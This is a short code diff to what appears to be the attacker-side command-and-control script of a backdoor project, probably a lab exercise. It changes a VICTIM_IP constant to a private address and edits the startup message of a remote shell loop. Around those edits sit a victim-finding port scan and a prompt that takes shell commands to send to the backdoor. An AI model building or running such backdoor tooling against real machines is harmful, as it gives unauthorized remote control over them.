@@ -6,7 +6,7 @@ import sys
 
 INIT_MESSAGE = b'This message will be signed and verified'
 BASE_PORT = 1234
-VICTIM_IP = '127.0.0.1'
+VICTIM_IP = '10.0.2.15'
 
 # on the attacker machine
 # sending information to the backdoor.py script
@@ -59,7 +59,7 @@ def find_victim(host = VICTIM_IP, port = BASE_PORT):
         port += 1
 
 def remote_shell():
-    print("[CNCServer] Starting terminal...")
+    print("[CNCServer] Type 'exit' to exit terminal. Starting terminal...")
 
     while True:
         cmd = input("$: ")
